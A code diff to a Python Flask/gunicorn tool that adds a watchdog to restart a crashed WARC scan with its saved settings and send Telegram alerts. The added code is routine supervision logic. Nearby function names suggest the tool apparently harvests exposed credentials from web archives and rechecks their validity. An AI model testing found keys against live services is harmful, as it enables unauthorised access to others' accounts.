@@ -2368,6 +2368,8 @@ _warc_state: dict = {
     'remote_pid': None,
     'r2_live_key': None,
     'r2_live_uploaded_at': None,
+    # Saved on every start so the watchdog can replay it on auto-restart.
+    'last_settings': None,
 }
 
 # Persisted snapshot of _warc_state so a gunicorn restart doesn't make the
@@ -2921,6 +2923,16 @@ def api_warc_start():
                 'r2_error': None, 'r2_account_id': None, 'r2_account_label': None,
                 'last_exit_code': None,
                 'dist_nodes': node_results,
+                'last_settings': {
+                    'max_domains': max_domains,
+                    'snapshots': snapshots,
+                    'extract_workers': extract_workers,
+                    'test_workers': test_workers,
+                    'nodes': nodes,
+                    'source': ','.join(source_list),
+                    'crt_tld': crt_tld or '',
+                    'crt_domain': crt_domain or '',
+                },
             })
         _save_warc_state()
 
@@ -3160,6 +3172,16 @@ def api_warc_start():
         _warc_state['r2_account_id'] = None
         _warc_state['r2_account_label'] = None
         _warc_state['last_exit_code'] = None
+        _warc_state['last_settings'] = {
+            'max_domains': max_domains,
+            'snapshots': snapshots,
+            'extract_workers': extract_workers,
+            'test_workers': test_workers,
+            'nodes': ['controller'],
+            'source': ','.join(source_list),
+            'crt_tld': crt_tld or '',
+            'crt_domain': crt_domain or '',
+        }
     _save_warc_state()
 
     threading.Thread(target=_warc_watch_and_upload, args=(warc_pid, dict(snapshot)), daemon=True).start()
@@ -8279,6 +8301,99 @@ def _recurring_fp_cleanup():
         _cleanup_false_positive_credentials()
 
 threading.Thread(target=_recurring_fp_cleanup, daemon=True, name='fp-cleanup').start()
+
+
+# ── WARC watchdog: auto-restart on crash + Telegram alert ────────────────
+def _warc_watchdog_loop() -> None:
+    """Checks every 5 min whether the WARC scan is alive. If it died
+    without a clean finished_at, alerts Telegram and restarts with the
+    same settings that were used for the last run."""
+    import urllib.request as _ur
+    _restart_count: dict = {}  # run_id → restart attempts (reset on new run)
+
+    while True:
+        time.sleep(300)
+        try:
+            _reload_warc_state_if_changed()
+            with _warc_lock:
+                state = dict(_warc_state)
+
+            last_settings = state.get('last_settings')
+            if not last_settings:
+                continue  # never started — nothing to guard
+
+            if state.get('finished_at') is not None:
+                continue  # clean finish; don't resurrect
+
+            pid = state.get('pid')
+            if not pid:
+                continue
+
+            # Liveness check
+            alive = False
+            try:
+                os.kill(int(pid), 0)
+                alive = True
+            except PermissionError:
+                alive = True
+            except (ProcessLookupError, OSError):
+                alive = False
+
+            if alive:
+                _restart_count.clear()
+                continue
+
+            # Dead — cap restarts to avoid infinite loops on broken binary
+            run_id = state.get('run_id', 'unknown')
+            attempts = _restart_count.get(run_id, 0)
+            if attempts >= 10:
+                _tg_send(
+                    f'🛑 <b>WARC watchdog gave up</b>\n'
+                    f'Run <code>{run_id}</code> has crashed 10 times in a row.\n'
+                    f'Manual intervention required.'
+                )
+                _restart_count[run_id] = attempts + 1  # keep counting so we don't spam
+                continue
+
+            domains = state.get('domains_found', 0) or 0
+            nodes = last_settings.get('nodes') or ['controller']
+            node_str = ' + '.join(str(n) for n in nodes)
+
+            _tg_send(
+                f'⚠️ <b>WARC died — auto-restarting</b>\n'
+                f'Run: <code>{run_id}</code>  (attempt {attempts + 1}/10)\n'
+                f'Nodes: {node_str}\n'
+                f'Domains banked: <b>{domains:,}</b>'
+            )
+
+            # Restart via loopback HTTP (gunicorn on 127.0.0.1:5000)
+            payload = json.dumps(last_settings).encode()
+            req = _ur.Request(
+                'http://127.0.0.1:5000/api/warc/start',
+                data=payload,
+                headers={'Content-Type': 'application/json'},
+                method='POST',
+            )
+            try:
+                with _ur.urlopen(req, timeout=120) as resp:
+                    result = json.loads(resp.read().decode() or '{}')
+                new_id = result.get('run_id') or result.get('run_id') or '?'
+                _restart_count[run_id] = attempts + 1
+                _restart_count.pop(new_id, None)  # fresh run resets its own counter
+                _tg_send(
+                    f'✅ <b>WARC restarted</b>\n'
+                    f'New run: <code>{new_id}</code>\n'
+                    f'Nodes: {node_str}'
+                )
+            except Exception as e:
+                _restart_count[run_id] = attempts + 1
+                _tg_send(f'❌ <b>WARC restart FAILED</b>\n{e}')
+
+        except Exception as e:
+            print(f'[warc-watchdog] error: {e}', flush=True)
+
+
+threading.Thread(target=_warc_watchdog_loop, daemon=True, name='warc-watchdog').start()
 
 
 def _recheck_one_credential(cred_id: int, cred_type: str, key_value: str, source_url: str, metadata: str) -> str:
